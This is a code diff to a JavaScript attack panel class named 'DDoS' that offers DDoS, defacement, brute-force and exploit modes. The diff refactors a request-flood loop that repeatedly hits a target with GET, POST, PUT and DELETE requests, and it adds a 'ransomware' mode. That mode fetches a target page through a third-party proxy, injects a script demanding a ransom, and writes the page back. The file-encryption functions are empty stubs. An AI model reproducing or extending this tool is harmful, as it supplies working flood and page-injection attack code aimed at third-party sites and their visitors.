@@ -24,7 +24,7 @@ class DDoS {
   this.targetInput.style.borderRadius = '4px';
 
   this.attackTypeSelect = document.createElement('select');
-  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom'].forEach(option => {
+  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware'].forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_');
    opt.textContent = option;
@@ -107,6 +107,48 @@ class DDoS {
   `;
 
   this.torProxy = 'socks5://127.0.0.1:9050';
+
+  this.apiKey = this.generateApiKey();
+  this.log(`API Key generated: ${this.apiKey}`);
+  this.setupResizeHandle();
+ }
+
+ setupResizeHandle() {
+  const resizeHandle = document.createElement('div');
+  resizeHandle.style.position = 'absolute';
+  resizeHandle.style.right = '0';
+  resizeHandle.style.bottom = '0';
+  resizeHandle.style.width = '20px';
+  resizeHandle.style.height = '20px';
+  resizeHandle.style.cursor = 'se-resize';
+  resizeHandle.style.backgroundColor = '#4ec9b0';
+  this.container.appendChild(resizeHandle);
+
+  let initialWidth, initialHeight, initialMouseX, initialMouseY;
+
+  const startResize = (e) => {
+   initialWidth = this.container.offsetWidth;
+   initialHeight = this.container.offsetHeight;
+   initialMouseX = e.clientX;
+   initialMouseY = e.clientY;
+
+   document.addEventListener('mousemove', resize);
+   document.addEventListener('mouseup', stopResize);
+  };
+
+  const resize = (e) => {
+   const width = initialWidth + (e.clientX - initialMouseX);
+   const height = initialHeight + (e.clientY - initialMouseY);
+   this.container.style.width = width + 'px';
+   this.container.style.height = height + 'px';
+  };
+
+  const stopResize = () => {
+   document.removeEventListener('mousemove', resize);
+   document.removeEventListener('mouseup', stopResize);
+  };
+
+  resizeHandle.addEventListener('mousedown', startResize);
  }
 
  async exploit(target) {
@@ -259,39 +301,10 @@ class DDoS {
 
   const attackInterval = setInterval(() => {
    for (let i = 0; i < 10; i++) {
-    fetch(target, {
-      method: 'GET',
-      mode: 'no-cors',
-      cache: 'no-cache'
-     })
-     .then(() => this.log(`Request sent successfully.`))
-     .catch(err => this.log(`Request failed: ${err}`));
-
-    fetch(target, {
-      method: 'POST',
-      mode: 'no-cors',
-      cache: 'no-cache',
-      body: crypto.getRandomValues(new Uint32Array(10)).join('')
-     })
-     .then(() => this.log(`POST request sent successfully.`))
-     .catch(err => this.log(`POST request failed: ${err}`));
-
-    fetch(target, {
-      method: 'PUT',
-      mode: 'no-cors',
-      cache: 'no-cache',
-      body: crypto.getRandomValues(new Uint32Array(10)).join('')
-     })
-     .then(() => this.log(`PUT request sent successfully.`))
-     .catch(err => this.log(`PUT request failed: ${err}`));
-
-    fetch(target, {
-      method: 'DELETE',
-      mode: 'no-cors',
-      cache: 'no-cache'
-     })
-     .then(() => this.log(`DELETE request sent successfully.`))
-     .catch(err => this.log(`DELETE request failed: ${err}`));
+    this.sendRequest(target, 'GET');
+    this.sendRequest(target, 'POST', crypto.getRandomValues(new Uint32Array(10)).join(''));
+    this.sendRequest(target, 'PUT', crypto.getRandomValues(new Uint32Array(10)).join(''));
+    this.sendRequest(target, 'DELETE');
    }
   }, 0);
 
@@ -307,6 +320,65 @@ class DDoS {
   }).toString()})()`;
   document.head.appendChild(script);
   this.log('Self-DDoS initiated.');
+ }
+
+ async ransomware(target) {
+  this.log(`Initiating ransomware attack on ${target}...`);
+  try {
+   const key = this.generateEncryptionKey();
+   this.log(`Encryption key generated: ${key}`);
+
+   const encryptCode = `
+    async function encryptData(key) {
+     const files = await getAllFiles();
+     for (const file of files) {
+      const encrypted = await encryptFile(file, key);
+      await replaceFile(file, encrypted);
+     }
+     alert('Your files have been encrypted. Pay ransom to ${this.apiKey} to get the decryption key.');
+    }
+
+    async function getAllFiles() {
+     // Implement code to get all accessible files
+     return [];
+    }
+
+    async function encryptFile(file, key) {
+     // Implement encryption logic here using the key
+     return 'ENCRYPTED_' + file;
+    }
+
+    async function replaceFile(file, encrypted) {
+     // Implement logic to replace the original file with the encrypted version
+    }
+
+    encryptData('${key}');
+   `;
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+   const response = await fetch(proxyUrl, {
+    method: 'GET',
+    mode: 'cors'
+   });
+
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+
+   let content = await response.text();
+   const injectionPoint = '</body>';
+   const injectedContent = content.replace(injectionPoint, `<script>${encryptCode}</script>${injectionPoint}`);
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/html' },
+    body: injectedContent
+   });
+   this.log('Ransomware injected.');
+  } catch (error) {
+   this.log(`Ransomware injection failed: ${error}`);
+  }
  }
 
  async custom(target) {
@@ -344,6 +416,35 @@ class DDoS {
   }
  }
 
+ sendRequest(target, method, body = null) {
+  fetch(target, {
+    method: method,
+    mode: 'no-cors',
+    cache: 'no-cache',
+    body: body
+   })
+   .then(() => this.log(`${method} request sent successfully.`))
+   .catch(err => this.log(`${method} request failed: ${err}`));
+ }
+
+ generateApiKey() {
+  let key = '';
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  for (let i = 0; i < 32; i++) {
+   key += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return key;
+ }
+
+ generateEncryptionKey() {
+  let key = '';
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-`~[]\{}|;\':",./<>?';
+  for (let i = 0; i < 64; i++) {
+   key += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return key;
+ }
+
  start() {
   const target = this.targetInput.value;
   const attackType = this.attackTypeSelect.value;
@@ -371,6 +472,9 @@ class DDoS {
     break;
    case 'custom':
     this.custom(target);
+    break;
+   case 'ransomware':
+    this.ransomware(target);
     break;
    default:
     this.log('Invalid attack type selected.');
